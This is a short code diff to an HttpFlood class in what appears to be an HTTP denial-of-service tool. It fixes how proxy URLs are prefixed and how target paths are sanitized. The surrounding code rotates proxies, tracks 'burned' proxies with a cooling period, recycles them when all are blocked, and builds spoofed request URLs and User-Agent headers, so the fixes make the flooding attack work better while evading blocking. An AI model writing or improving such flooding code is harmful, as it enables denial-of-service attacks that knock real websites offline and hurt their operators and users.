@@ -1584,10 +1584,14 @@ class HttpFlood(Thread):
                 p_str = str(p)
                 burn_time = BURNED_PROXIES.get(p_str)
                 if not burn_time or (time() - burn_time >= COOLING_PERIOD):
-                    # [PHASE 5] Smart Protocol Detection for httpx
-                    prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
-                    proxy_url = f"{prefix}{p_str}"
-                    self._current_proxy = p_str # Keep sync with other methods
+                    # [FIX] PyRoxy str(p) often includes prefix already. Avoid double prefix.
+                    if "://" in p_str:
+                        proxy_url = p_str
+                    else:
+                        prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
+                        proxy_url = f"{prefix}{p_str}"
+                    
+                    self._current_proxy = p_str 
                     break
             else:
                 # [PHASE 13] Trigger recycle if all proxies are burned
@@ -1598,9 +1602,13 @@ class HttpFlood(Thread):
 
         # [PHASE 13] Correct URL Construction for Spoofing & httpx Compatibility
         target_domain = self._target.user or self._target.host
-        # httpx authority includes user/pass which breaks URL if placed directly.
-        # We want the actual host or the IP if targeted directly.
-        clean_target_url = f"{self._target.scheme}://{self._target.host}{path}"
+        
+        # [FIX] Sanitize path to avoid double slashes (common in crawled links)
+        safe_path = path if path.startswith("/") else f"/{path}"
+        if safe_path.startswith("//"): 
+            safe_path = "/" + safe_path.lstrip("/")
+
+        clean_target_url = f"{self._target.scheme}://{self._target.host}{safe_path}"
 
         headers = {
             "User-Agent": ua,
